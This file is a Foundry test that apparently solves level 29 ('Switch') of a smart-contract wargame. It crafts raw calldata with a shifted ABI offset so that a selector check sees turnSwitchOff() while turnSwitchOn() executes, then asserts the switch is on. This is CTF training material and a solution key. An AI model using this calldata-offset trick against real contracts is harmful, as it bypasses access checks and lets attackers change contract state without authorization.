// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Switch} from "../src/Level29.sol";

contract Level29Test is Test {
    Switch public target;
    address public token1;
    address public token2;

    VmSafe.Wallet attacker;
    VmSafe.Wallet player;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");
        target = new Switch();
    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(address(target));
        vm.stopPrank();

        assertTrue(target.switchOn());
    }

    function exploit(address _target) private {
        bytes memory data = abi.encodePacked(
            bytes4(keccak256("flipSwitch(bytes)")),
            uint256(0x60),
            uint256(4),
            bytes32(bytes4(keccak256("turnSwitchOff()"))),
            uint256(4),
            bytes32(bytes4(keccak256("turnSwitchOn()")))
        );
        _target.call(data);
    }
}
